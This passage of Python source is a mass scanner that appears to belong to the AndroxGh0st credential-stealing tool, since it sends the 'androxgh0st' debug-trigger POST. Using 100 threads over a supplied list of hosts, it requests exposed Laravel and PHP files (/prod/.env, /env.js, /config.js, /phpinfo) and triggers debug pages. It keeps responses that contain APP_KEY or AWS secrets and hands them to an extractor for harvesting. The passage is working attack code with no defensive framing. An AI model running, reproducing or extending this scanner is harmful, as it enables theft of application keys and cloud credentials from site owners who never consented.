                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def prod_env(url):
    method = '/prod/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_js(url):
    method = '/env.js'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_js(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def debug(url):
    method = 'DEBUG'
    
    try:
        req = requests.post('http://{}'.format(url),data={"0x[]":"androxgh0st"},headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
            req = requests.post('https://{}'.format(url),data={"0x[]":"androxgh0st"},headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = debugfixer(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = debugfixer(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.post('https://{}'.format(url),data={"0x[]":"androxgh0st"},headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = debugfixer(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def config_js(url):
    method = '/config.js'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        req = str(req).replace(' ','')
        if '={' in str(req):
            req = str(req).replace('\n','')
            req = reg('={(.*?)}',str(req))
            for d in req:
                if 'aws' in str(d).lower():
                    req = d
                    break
            req = str(req).replace(',',',\n')
            if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
                req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
                req = str(req).replace(' ','')
                if '={' in str(req):
                    req = str(req).replace('\n','')
                    req = reg('={(.*?)}',str(req))
                    for d in req:
                        if 'aws' in str(d).lower():
                            req = d
                            break
                    req = str(req).replace(',',',\n')
                    if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                        if 'exception' not in str(req).lower():
                            req = reformat_text_config_js(req)
                            if str(req).replace('\n','').replace(' ','') != '':
                                if chk:
                                    print(req)
                                Extractor(url,method,req)
                                return True
                        else:
                            req = reformat_text_Exception(req)
                            if str(req).replace('\n','').replace(' ','') != '':
                                if chk:
                                    print(req)
                                Extractor(url,method,req)
                                return True
            else:
                if 'exception' not in str(req).lower():
                    req = reformat_text_config_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            req = str(req).replace(' ','')
            if '={' in str(req):
                req = str(req).replace('\n','')
                req = reg('={(.*?)}',str(req))
                for d in req:
                    if 'aws' in str(d).lower():
                        req = d
                        break
                req = str(req).replace(',',',\n')
                if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                    if 'exception' not in str(req).lower():
                        req = reformat_text_config_js(req)
                        if str(req).replace('\n','').replace(' ','') != '':
                            if chk:
                                print(req)
                            Extractor(url,method,req)
                            return True
                    else:
                        req = reformat_text_Exception(req)
                        if str(req).replace('\n','').replace(' ','') != '':
                            if chk:
                                print(req)
                            Extractor(url,method,req)
                            return True
        except:
            pass
    return False
    
def phpinfo(url):
    method = '/phpinfo'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                req = reformat_text_phpinfo(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False
    
def phpinfo_php(url):
    method = '/phpinfo.php'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                req = reformat_text_phpinfo(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def laravel_check(url):
    if not env(url):
        if not env_save(url):
            if not env_php(url):
                if not beta_env(url):
                    if not prod_env(url):
                        if not env_js(url):
                            if not debug(url):
                                if not phpinfo(url):
                                    if not phpinfo_php(url):
                                        print("{}[\u001b[32;1m+\u001b[0m] {} [ {}Couldn't Find Anything{} ] ".format(fw,url,fr,fw))
                                        return False

def check():
    os.system('cls')
    logos.laravel()
    lista = list(x.strip() for x in open(input('{}[{}+{}] List : '.format(fw,fg,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(laravel_check,lista)
    except Exception as e:
        print(e)
        pass